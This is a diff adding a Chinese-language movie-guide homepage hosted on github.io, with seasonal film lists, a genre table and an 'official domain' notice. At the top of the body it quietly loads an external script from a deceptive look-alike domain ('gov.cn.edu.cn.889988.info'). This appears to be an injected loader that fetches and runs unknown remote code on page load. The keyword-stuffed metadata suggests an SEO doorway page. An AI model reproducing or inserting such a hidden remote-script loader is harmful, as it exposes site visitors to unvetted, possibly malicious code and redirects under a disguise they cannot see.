@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#2b2118">
+<title>俺去啦电影网 | 街坊式影视片单与观影指南：院线新片、经典老片、热播剧集一网打尽</title>
+<meta name="description" content="俺去啦电影网是一份写给普通观众的影视片单与观影指南。我们不搞高冷影评，也不堆砌评分数字，只做三件实在事：告诉你这片子讲了个什么故事、大概要花多长时间、看完会不会后悔。片单覆盖院线新片、经典老片、热播剧集、口碑综艺、动漫新番与冷门纪录片，按心情、片长、地区、题材和观看场景五重方式整理。每一行都写有人话版看点，每一期都标明归档日期。工作日碎片时间看短篇，周末窝沙发看长篇，带娃带长辈有专门的合家欢分区。片单每月复核，资源状态会同步更新，失效条目及时撤下。本站不托管视频文件，只做整理与导航，让你少走弯路、少踩坑、少浪费两个小时。">
+<meta name="keywords" content="俺去啦电影网,anquladianyingwang,俺去啦影视,电影片单,观影指南,影视导航,院线新片,经典老片,热播剧集,口碑综艺,动漫新番,冷门纪录片,华语片单,欧美片单,日韩剧集,短篇电影,合家欢影视,影视归档整理,看什么电影,周末看片推荐">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="revisit-after" content="7 days">
+<link rel="canonical" href="https://anquladianyingwang-zh.github.io/">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#241c14;--ink2:#5b4e3f;--ink3:#8d7e6a;--paper:#f7f3ea;--paper2:#efe8db;--paper3:#e6dcc8;
+  --line:#d8c9ad;--line2:#c2ad86;--rust:#9a3b20;--rust2:#c85a30;--gold:#c79a3a;--gold2:#e0bd68;--moss:#4f5d35;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;background:var(--paper);color:var(--ink);font-size:16px;line-height:1.8}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{max-width:1280px;margin:0 auto;padding:0 30px}
+
+/* ===== 顶部信息条 ===== */
+.ticker{background:var(--ink);color:#e8ddc8;font-size:13px;border-bottom:3px solid var(--rust)}
+.ticker .wrap{display:flex;justify-content:space-between;gap:16px;padding-top:10px;padding-bottom:10px;flex-wrap:wrap}
+.ticker .marquee{flex:1;min-width:240px;overflow:hidden;white-space:nowrap;position:relative;height:1.6em}
+.ticker .marquee span{display:inline-block;padding-left:100%;animation:mq 32s linear infinite}
+.ticker .marquee span b{color:var(--gold2);font-weight:600}
+@keyframes mq{from{transform:translateX(0)}to{transform:translateX(-100%)}}
+.ticker .links a{color:#d5c6a9;margin-left:16px;white-space:nowrap}
+.ticker .links a:hover{color:#fff;text-decoration:underline;text-underline-offset:3px}
+
+/* ===== 报头 ===== */
+.banner{background:linear-gradient(180deg,#2b2118 0%,#3a2c1d 100%);color:#f3ebd9;padding:34px 0 0}
+.banner .wrap{display:grid;grid-template-columns:auto 1fr auto;gap:30px;align-items:center;padding-bottom:26px}
+.crest{width:76px;height:76px;border:2px solid var(--gold2);border-radius:50%;display:grid;place-items:center;text-align:center;font-family:"Noto Serif SC","Songti SC",Georgia,serif;line-height:1.15;flex-shrink:0}
+.crest b{font-size:17px;color:var(--gold2);letter-spacing:1px}
+.crest small{font-size:8.5px;letter-spacing:2px;color:#c6b48e;font-family:sans-serif}
+.brand h1{font-family:"Noto Serif SC","Songti SC",Georgia,serif;font-size:clamp(28px,5vw,52px);line-height:1.1;letter-spacing:2px}
+.brand h1 i{font-style:normal;color:var(--gold2)}
+.brand p{margin-top:8px;font-size:13.5px;color:#c6b48e;letter-spacing:1px}
+.brand p em{font-style:normal;color:#8fb3ad}
+.ver{text-align:right;border-left:1px solid rgba(224,189,104,.35);padding-left:24px;font-size:12px;color:#c6b48e;line-height:1.9}
+.ver code{display:block;font-family:ui-monospace,Menlo,monospace;font-size:13px;color:var(--gold2);word-break:break-all;margin-top:4px}
+
+/* ===== 导航 ===== */
+nav.tabs{background:var(--rust)}
+nav.tabs .wrap{display:flex;overflow-x:auto;scrollbar-width:none}
+nav.tabs .wrap::-webkit-scrollbar{display:none}
+nav.tabs a{flex-shrink:0;padding:14px 26px;color:#f3e6d8;font-size:15px;border-right:1px solid rgba(255,255,255,.18);white-space:nowrap;transition:.15s}
+nav.tabs a:first-child{border-left:1px solid rgba(255,255,255,.18)}
+nav.tabs a:hover{background:var(--rust2);color:#fff}
+nav.tabs a.cur{background:var(--gold);color:#241c14;font-weight:700}
+
+/* ===== 双线报头 ===== */
+.dbl{border-top:1px solid var(--line2);border-bottom:3px double var(--line2);margin:54px 0 22px}
+.dbl .wrap{display:grid;grid-template-columns:88px 1fr auto;gap:20px;align-items:end;padding-top:14px;padding-bottom:14px}
+.dbl .no{font-family:"Noto Serif SC",serif;font-size:38px;color:var(--rust);line-height:1;font-weight:800}
+.dbl h2{font-family:"Noto Serif SC","Songti SC",Georgia,serif;font-size:clamp(21px,3.2vw,30px);line-height:1.4}
+.dbl h2 small{display:block;font-family:sans-serif;font-size:11px;letter-spacing:3px;color:var(--ink3);font-weight:400;margin-top:5px}
+.dbl a{font-size:13.5px;color:var(--rust);border-bottom:1px solid var(--rust);padding-bottom:2px;white-space:nowrap}
+
+/* ===== 栏目一：导读 ===== */
+.lede{display:grid;grid-template-columns:1.3fr 1fr;gap:0;border:1px solid var(--line);background:#fff}
+.lede .txt{padding:34px 34px 30px;border-right:1px solid var(--line)}
+.lede .txt .kicker{font-size:11px;letter-spacing:5px;color:var(--rust);font-family:sans-serif}
+.lede .txt h3{font-family:"Noto Serif SC","Songti SC",Georgia,serif;font-size:clamp(22px,3.2vw,30px);line-height:1.55;margin:12px 0 18px}
+.lede .txt h3 mark{background:none;color:var(--rust);font-weight:800}
+.lede .txt p{font-size:15px;color:var(--ink2);line-height:2;margin-bottom:12px}
+.lede .txt ul{margin-top:20px;border-top:1px solid var(--line);padding-top:20px}
+.lede .txt ul li{padding:8px 0 8px 26px;position:relative;font-size:14.5px;color:var(--ink2);border-bottom:1px dashed var(--line)}
+.lede .txt ul li:last-child{border-bottom:none}
+.lede .txt ul li::before{content:"◆";position:absolute;left:2px;top:8px;color:var(--gold);font-size:10px}
+.lede .txt ul li b{color:var(--ink)}
+.lede .mood{border-left:none;display:grid;grid-template-columns:1fr 1fr}
+.lede .mood div{padding:24px 26px;border-bottom:1px solid var(--line);border-left:1px solid var(--line)}
+.lede .mood div:nth-child(odd){border-left:none}
+.lede .mood div:nth-last-child(-n+2){border-bottom:none}
+.lede .mood div b{display:block;font-family:"Noto Serif SC",serif;font-size:18px;margin-bottom:6px}
+.lede .mood div b i{font-style:normal;color:var(--rust);font-size:12px;font-family:sans-serif;letter-spacing:1px;margin-left:6px}
+.lede .mood div p{font-size:13px;color:var(--ink2);line-height:1.8}
+
+/* ===== 栏目二：月份片单 ===== */
+.months{display:grid;grid-template-columns:repeat(4,1fr);border:1px solid var(--line);background:#fff}
+.months article{padding:26px 24px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);transition:.2s}
+.months article:nth-child(4n){border-right:none}
+.months article:nth-child(n+5){border-bottom:none}
+.months article:hover{background:var(--paper2);transform:translateY(-3px)}
+.months article h4{font-family:"Noto Serif SC","Songti SC",Georgia,serif;font-size:19px;margin-bottom:4px}
+.months article h4 span{font-size:11px;color:var(--ink3);font-family:sans-serif;letter-spacing:2px;margin-left:6px}
+.months article .sub{font-size:12.5px;color:var(--rust);margin-bottom:14px;min-height:2.6em;line-height:1.6}
+.months article ol li{font-size:13.5px;padding:7px 0;border-top:1px dotted var(--line);display:grid;grid-template-columns:1fr auto;gap:8px}
+.months article ol li:first-child{border-top:none}
+.months article ol li em{font-style:normal;font-size:11px;color:var(--ink3);font-family:ui-monospace,Menlo,monospace}
+.months article ol li:hover{color:var(--rust)}
+.months article .more{display:inline-block;margin-top:14px;font-size:12px;color:var(--rust);border-bottom:1px solid var(--rust)}
+
+/* ===== 栏目三：目录表 ===== */
+.catbox{border:1px solid var(--line);background:#fff}
+.catbox table{width:100%;border-collapse:collapse}
+.catbox caption{caption-side:top;text-align:left;background:var(--paper3);padding:12px 24px;font-size:11.5px;letter-spacing:4px;color:var(--ink2)}
+.catbox th,.catbox td{padding:14px 20px;text-align:left;border-bottom:1px solid var(--line);font-size:14.5px;vertical-align:top}
+.catbox th{background:#fff;font-family:"Noto Serif SC",serif;font-size:13px;color:var(--rust);letter-spacing:1px;border-bottom:2px solid var(--rust)}
+.catbox tbody tr:hover{background:var(--paper2)}
+.catbox td.n{font-family:"Noto Serif SC",serif;font-size:16px;color:var(--line2);width:52px}
+.catbox td.name{font-family:"Noto Serif SC","Songti SC",Georgia,serif;font-size:16px;width:22%}
+.catbox td.name small{display:block;font-size:11.5px;color:var(--ink3);font-family:sans-serif;letter-spacing:1px}
+.catbox td.note{color:var(--ink2);font-size:14px;line-height:1.75}
+.catbox td.f{font-family:ui-monospace,Menlo,monospace;font-size:12.5px;color:var(--ink3);white-space:nowrap}
+.catbox td.tag i{font-style:normal;font-size:11.5px;background:var(--paper3);color:var(--ink2);padding:3px 9px;margin:0 4px 4px 0;display:inline-block;border-radius:2px}
+.catbox td.tag i.r{background:var(--rust);color:#fff}
+.catbox td.tag i.g{background:var(--moss);color:#fff}
+.catbox td.tag i.y{background:var(--gold);color:#241c14}
+
+/* ===== 栏目四：地址与说明 ===== */
+.stamp{display:grid;grid-template-columns:1fr 1fr;gap:28px;align-items:start}
+.stamp .box{border:1px solid var(--line);background:#fff;padding:30px 32px}
+.stamp .box h4{font-family:"Noto Serif SC","Songti SC",Georgia,serif;font-size:19px;margin-bottom:14px;display:flex;align-items:center;gap:10px}
+.stamp .box h4::before{content:"";width:6px;height:24px;background:var(--rust)}
+.stamp .box p{font-size:14px;color:var(--ink2);line-height:1.95;margin-bottom:14px}
+.stamp .box p b{color:var(--rust)}
+.stamp .addr{border:3px double var(--rust);padding:26px 26px 22px;position:relative;background:var(--paper2)}
+.stamp .addr::after{content:"AUT \000A ONLY";white-space:pre;position:absolute;right:18px;top:14px;font-family:ui-monospace,Menlo,monospace;font-size:10px;line-height:1.5;color:var(--rust);letter-spacing:2px;opacity:.45;border:1px solid var(--rust);padding:6px 8px}
+.stamp .addr .lb{font-size:11px;letter-spacing:4px;color:var(--rust);margin-bottom:10px}
+.stamp .addr code{display:block;font-family:ui-monospace,Menlo,monospace;font-size:17px;color:var(--ink);background:#fff;border:1px solid var(--line);padding:16px 18px;word-break:break-all;letter-spacing:.4px}
+.stamp .addr .go{display:inline-block;margin-top:16px;background:var(--rust);color:#fff;font-size:13px;padding:9px 20px;letter-spacing:1px}
+.stamp .addr .go:hover{background:var(--rust2)}
+.stamp .notes ul li{padding:10px 0 10px 22px;position:relative;font-size:14px;color:var(--ink2);line-height:1.85;border-bottom:1px dashed var(--line)}
+.stamp .notes ul li:last-child{border-bottom:none}
+.stamp .notes ul li::before{content:"✓";position:absolute;left:0;color:var(--moss);font-weight:700}
+.stamp .notes ul li b{color:var(--ink)}
+
+/* ===== 页脚 ===== */
+footer{margin-top:60px;background:var(--ink);color:#c6b48e;padding:46px 0 26px}
+.fgrid{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:34px}
+.fgrid h5{font-family:"Noto Serif SC","Songti SC",Georgia,serif;font-size:16px;color:#f3ebd9;margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid rgba(224,189,104,.25)}
+.fgrid ul li{padding:5px 0;font-size:13.5px}
+.fgrid ul li a{color:#a99677}
+.fgrid ul li a:hover{color:#fff;text-decoration:underline;text-underline-offset:3px}
+.fgrid .about p{font-size:13.5px;color:#a99677;line-height:1.95}
+.fgrid .about .dom{margin-top:16px;border:1px solid rgba(224,189,104,.3);padding:12px 16px;font-size:12.5px;color:var(--gold2);font-family:ui-monospace,Menlo,monospace;word-break:break-all}
+.fbot{margin-top:30px;border-top:1px solid rgba(224,189,104,.2);padding-top:20px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:12.5px;color:#8d7a5c}
+.fbot b{color:var(--gold2)}
+.fbot a{color:#a99677}
+.fbot a:hover{color:#fff}
+
+/* ===== 响应式 ===== */
+@media (max-width:1020px){
+  .lede{grid-template-columns:1fr}
+  .lede .txt{border-right:none;border-bottom:1px solid var(--line)}
+  .months{grid-template-columns:repeat(2,1fr)}
+  .months article:nth-child(4n){border-right:1px solid var(--line)}
+  .months article:nth-child(2n){border-right:none}
+  .months article:nth-child(n+5){border-bottom:1px solid var(--line)}
+  .months article:nth-child(n+3){border-bottom:none}
+  .stamp{grid-template-columns:1fr}
+  .fgrid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:680px){
+  .wrap{padding:0 15px}
+  .banner .wrap{grid-template-columns:1fr;text-align:left}
+  .crest{width:64px;height:64px}
+  .ver{border-left:none;border-top:1px solid rgba(224,189,104,.35);padding-left:0;padding-top:16px;text-align:left}
+  .dbl .wrap{grid-template-columns:1fr}
+  .dbl .no{font-size:30px}
+  .lede .mood{grid-template-columns:1fr}
+  .lede .mood div{border-left:none!important}
+  .catbox{overflow-x:auto}
+  .catbox table{min-width:640px}
+  .stamp .addr::after{display:none}
+  .fgrid{grid-template-columns:1fr}
+  .ticker .links{display:none}
+}
+@media print{body{background:#fff;color:#000}.banner,.ticker,nav.tabs,footer{background:#fff;color:#000}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="ticker">
+  <div class="wrap">
+    <div class="marquee"><span>最新一期片单已上线 · <b>秋季档院线新片</b>补充八部，经典老片修复专区新增三部 · 每周三更新口碑榜 · 失效条目四十八小时内撤换</span></div>
+    <div class="links"><a href="#">设为首页</a><a href="#">投稿合作</a><a href="#">留言反馈</a><a href="#">夜间模式</a></div>
+  </div>
+</div>
+
+<header class="banner">
+  <div class="wrap">
+    <div class="crest"><b>俺去<br>啦</b><small>FILM GUIDE</small></div>
+    <div class="brand">
+      <h1>俺去啦<i>电影网</i></h1>
+      <p>街坊式影视片单与观影指南 · <em>anquladianyingwang-zh.github.io</em> · 不整虚的，只说这片子值不值得看</p>
+    </div>
+    <div class="ver">本期归档<br><b>2026 年秋季档</b><code>anquladianyingwang-zh.github.io</code></div>
+  </div>
+</header>
+
+<nav class="tabs">
+  <div class="wrap">
+    <a href="#c1" class="cur">导读</a>
+    <a href="#c2">按月选片</a>
+    <a href="#c3">题材目录</a>
+    <a href="#c4">官方入口</a>
+    <a href="#">观影日历</a>
+    <a href="#">看片指南</a>
+    <a href="#">更新日志</a>
+    <a href="#">关于俺们</a>
+  </div>
+</nav>
+
+<main class="wrap">
+
+  <section class="dbl" id="c1">
+    <div class="wrap">
+      <div class="no">壹</div>
+      <h2>导读：找片这件事，本来不该这么累<small>EDITORIAL · 为什么俺们要整理这份片单</small></h2>
+      <a href="#">阅读完整导读 »</a>
+    </div>
+  </section>
+  <section class="lede" aria-label="导读">
+    <div class="txt">
+      <div class="kicker">本期卷首 · WHY WE DO THIS</div>
+      <h3>评分能帮你排序，<mark>但决定你点不点开的，是你现在的心情。</mark></h3>
+      <p>俺去啦电影网的判断标准很朴素：一部片子值不值得看，取决于它能不能在你当下的状态下讲完一个完整的故事。所以我们整理时关注的不是它打了几分，而是三件实在事——<strong>讲了个什么故事、大概要花多长时间、看完会不会后悔</strong>。这些信息在别处常常被省略，却恰恰是你翻片单时最想知道的。</p>
+      <p>片单覆盖院线新片、经典老片、热播剧集、口碑综艺、动漫新番与冷门纪录片，按心情、片长、地区、题材和观看场景五重方式归档。每一行都写有人话版看点，每一期都标明归档日期，每周复核，每月大调。</p>
+      <ul>
+        <li><b>先定心情</b>，再挑片——独处、约会、聚会、亲子，四种状态对应完全不同的片单，我们按场景分好了。</li>
+        <li><b>再看片长</b>——有空看九十分钟，没空看四十五分钟，反着来多半会后悔，所以片长永远写在最前面。</li>
+        <li><b>最后看标签</b>——修复版、单场景、群像、实拍、慢节奏，这些细节才是真正的观感开关。</li>
+        <li><b>别只信评分</b>——评分帮我们排序，但你当下的心情才是真正的筛选器，这也是本站的出发点。</li>
+      </ul>
+    </div>
+    <div class="mood">
+      <div><b>独处一人的晚上<i>SOLO</i></b><p>悬疑、犯罪、单场景密闭空间片优先。需要专注但不沉重，九十分钟左右最合适。</p></div>
+      <div><b>约会或朋友聚会<i>SOCIAL</i></b><p>喜剧、爱情、轻悬疑为主。节奏要快，笑点要贴地，别选慢热长片。</p></div>
+      <div><b>周末窝在沙发<i>WEEKEND</i></b><p>三集连看或一部两小时长篇，纪录片系列、群像剧、修复版老片是首选。</p></div>
+      <div><b>带娃或带长辈<i>FAMILY</i></b><p>合家欢专区单独筛选，避开重口、过长铺垫与复杂叙事，时长控制在百分钟内。</p></div>
+    </div>
+  </section>
+
+  <section class="dbl" id="c2">
+    <div class="wrap">
+      <div class="no">贰</div>
+      <h2>按月选片：把时间预算算清楚<small>MONTHLY PICKS · 片长优先的四季片单</small></h2>
+      <a href="#">查看完整片单 »</a>
+    </div>
+  </section>
+  <section class="months">
+    <article><h4>春季档<small>SPRING</small></h4><div class="sub">适合换季时看，节奏轻快、画面明亮</div>
+      <ol><li><span>春风里的便利店</span><em>喜剧 96min</em></li><li><span>第七封情书</span><em>爱情 102min</em></li>
+      <li><span>樱花落之前</span><em>日剧 10集</em></li><li><span>小镇快递员</span><em>剧情 88min</em></li></ol>
+      <a href="#" class="more">展开 14 部 →</a></article>
+    <article><h4>夏季档<small>SUMMER</small></h4><div class="sub">大片与爽片扎堆，适合电影院与空调房</div>
+      <ol><li><span>逆光追踪</span><em>动作 118min</em></li><li><span>海边的理发师</span><em>剧情 104min</em></li>
+      <li><span>极速终点线</span><em>动作 96min</em></li><li><span>热带病院</span><em>悬疑 12集</em></li></ol>
+      <a href="#" class="more">展开 16 部 →</a></article>
+    <article><h4>秋季档<small>AUTUMN</small></h4><div class="sub">本届重点，文艺与犯罪双线并行</div>
+      <ol><li><span>沉默的证词</span><em>犯罪 118min</em></li><li><span>旧巷追踪</span><em>犯罪 105min</em></li>
+      <li><span>苔藓下的时间</span><em>纪录片 4K</em></li><li><span>第七个证人</span><em>日剧 8集</em></li></ol>
+      <a href="#" class="more">展开 18 部 →</a></article>
+    <article><h4>冬季档<small>WINTER</small></h4><div class="sub">适合窝着看的长篇与合家欢</div>
+      <ol><li><span>雪落无声</span><em>剧情 132min</em></li><li><span>年夜饭那一桌</span><em>合家欢 90min</em></li>
+      <li><span>北方以北</span><em>纪录片 6集</em></li><li><span>最后的放映师</span><em>剧情 110min</em></li></ol>
+      <a href="#" class="more">展开 15 部 →</a></article>
+  </section>
+
+  <section class="dbl" id="c3">
+    <div class="wrap">
+      <div class="no">叁</div>
+      <h2>题材目录：十二类，类类有人话版看点<small>CATALOGUE · 不止类型名，还有观感说明</small></h2>
+      <a href="#">查看完整目录 »</a>
+    </div>
+  </section>
+  <section class="catbox">
+    <table>
+      <caption>题材分类总表 · 共 12 类 / 本周在榜条目 62 条 / 每周三复核</caption>
+      <thead><tr><th style="width:52px">序</th><th style="width:20%">题材与分区</th><th>人话版看点说明</th><th style="width:17%">常见标签</th><th style="width:92px">归档日期</th></tr></thead>
+      <tbody>
+        <tr><td class="n">01</td><td class="name">悬疑犯罪<small>Crime · Mystery</small></td><td class="note">反转集中在后段，靠台词和细节推进，适合注意力集中时看，不适合当背景音。</td><td class="tag"><i class="r">高反转</i><i>台词流</i><i>长片向</i></td><td class="f">10.05</td></tr>
+        <tr><td class="n">02</td><td class="name">喜剧爱情<small>Comedy · Romance</small></td><td class="note">笑点与情感各占一半，节奏贴地，是聚会和约会场景的首选类型。</td><td class="tag"><i class="y">聚会向</i><i>轻快</i></td><td class="f">10.04</td></tr>
+        <tr><td class="n">03</td><td class="name">动作惊悚<small>Action · Thriller</small></td><td class="note">以实拍与长镜头为主，多数控制在九十六分钟内，属于标准的短篇爽片。</td><td class="tag"><i class="g">实拍</i><i class="g">短篇</i></td><td class="f">10.03</td></tr>
+        <tr><td class="n">04</td><td class="name">动画奇幻<small>Animation · Fantasy</small></td><td class="note">含日漫新番、国漫剧场版与修复版，标注连载状态与话数，方便连续追看。</td><td class="tag"><i class="y">连载</i><i class="r">修复版</i></td><td class="f">10.02</td></tr>
+        <tr><td class="n">05</td><td class="name">纪录片<small>Documentary</small></td><td class="note">多为系列化长片，自然类多提供 4K 版本，单集约五十二分钟，适合周末连看。</td><td class="tag"><i class="g">4K</i><i class="g">系列</i></td><td class="f">10.04</td></tr>
+        <tr><td class="n">06</td><td class="name">合家欢<small>Family</small></td><td class="note">亲子共看与长辈适看双重筛选，避开重口与过长铺垫，片长多在百分钟内。</td><td class="tag"><i class="y">亲子</i><i class="y">长辈适看</i></td><td class="f">09.30</td></tr>
+        <tr><td class="n">07</td><td class="name">剧集专区<small>Drama Series</small></td><td class="note">华语、美剧、韩剧、日剧、泰剧分区，标注季数、集数与单集时长，方便排期。</td><td class="tag"><i class="r">长篇</i><i>追更</i></td><td class="f">09.29</td></tr>
+        <tr><td class="n">08</td><td class="name">口碑榜单<small>Top Charts</small></td><td class="note">周榜、月榜与年度榜三档，每周三早八点更新，附上榜理由而非只给名次。</td><td class="tag"><i class="y">每周更新</i></td><td class="f">10.01</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section class="dbl" id="c4">
+    <div class="wrap">
+      <div class="no">肆</div>
+      <h2>官方入口与使用说明<small>OFFICIAL ENTRY · 认准域名，远离仿冒</small></h2>
+      <a href="#">查看完整声明 »</a>
+    </div>
+  </section>
+  <section class="stamp">
+    <div class="box">
+      <div class="addr">
+        <div class="lb">OFFICIAL ENTRY · 唯一官方访问地址</div>
+        <code>https://anquladianyingwang-zh.github.io</code>
+        <a href="#" class="go">访问俺去啦电影网 →</a>
+        <p style="margin-top:16px;font-size:13px">本站所有访问入口均指向同一域名，其他名称相近的地址均与俺们无关。如发现仿冒站点，欢迎通过留言反馈举报。</p>
+      </div>
+    </div>
+    <div class="box notes">
+      <h4>关于这份片单，俺们先说清楚</h4>
+      <ul>
+        <li><b>只做整理，不托管文件。</b>本站是影视片单与观影指南性质的索引平台，不托管任何视频文件，也不做二次跳转。</li>
+        <li><b>片长写在最前面。</b>因为决定你会不会点开的往往不是评分，而是当下有没有两小时。</li>
+        <li><b>清晰度按来源标注。</b>1080P 与 4K 修复片单独分类展示，标注仅代表来源版本，实际观感受设备与播放环境影响。</li>
+        <li><b>每周复核一次。</b>口碑数据、类型归类与资源状态都会重新核对，失效条目一般在四十八小时内撤换。</li>
+        <li><b>出错请直接说。</b>通过留言反馈通道告知即可，一般两个工作日内回复，错标类问题优先处理。</li>
+      </ul>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div class="about">
+        <h5>俺去啦电影网</h5>
+        <p>街坊式影视片单与观影指南。评分帮我们排序，你当下的心情才是真正的筛选器——这是俺们整理这份片单的出发点。院线新片、经典老片、热播剧集、口碑综艺、动漫新番与冷门纪录片，都按心情、片长、地区、题材和观看场景重新归过档。</p>
+        <div class="dom">官方唯一域名：anquladianyingwang-zh.github.io</div>
+      </div>
+      <div><h5>按月选片</h5><ul>
+        <li><a href="#">春季档片单</a></li><li><a href="#">夏季档片单</a></li>
+        <li><a href="#">秋季档片单</a></li><li><a href="#">冬季档片单</a></li>
+        <li><a href="#">短篇合集</a></li><li><a href="#">修复版专区</a></li>
+      </ul></div>
+      <div><h5>题材分类</h5><ul>
+        <li><a href="#">悬疑犯罪</a></li><li><a href="#">喜剧爱情</a></li>
+        <li><a href="#">动作惊悚</a></li><li><a href="#">动画奇幻</a></li>
+        <li><a href="#">纪录片</a></li><li><a href="#">合家欢</a></li>
+      </ul></div>
+      <div><h5>关于与帮助</h5><ul>
+        <li><a href="#">看片指南</a></li><li><a href="#">观影日历</a></li>
+        <li><a href="#">更新日志</a></li><li><a href="#">内容声明</a></li>
+        <li><a href="#">投稿合作</a></li><li><a href="#">返回顶部 ↑</a></li>
+      </ul></div>
+    </div>
+    <div class="fbot">
+      <span>© <span id="yr"></span> 俺去啦电影网（俺去啦影视片单与观影指南）。本站为影视索引与导航性质，不托管视频文件，片单条目标注第三方来源，请自行核验；内容仅供索引参考，不构成观看或消费决策的唯一依据。</span>
+      <span>官方域名：<b>anquladianyingwang-zh.github.io</b> · <a href="#">返回首页</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+(function(){
+  var as=document.querySelectorAll('nav.tabs a[href^="#"]');
+  as.forEach(function(a){
+    a.addEventListener('click',function(){
+      as.forEach(function(x){x.classList.remove('cur')});
+      a.classList.add('cur');
+    });
+  });
+})();
+</script>
+</body>
+</html>
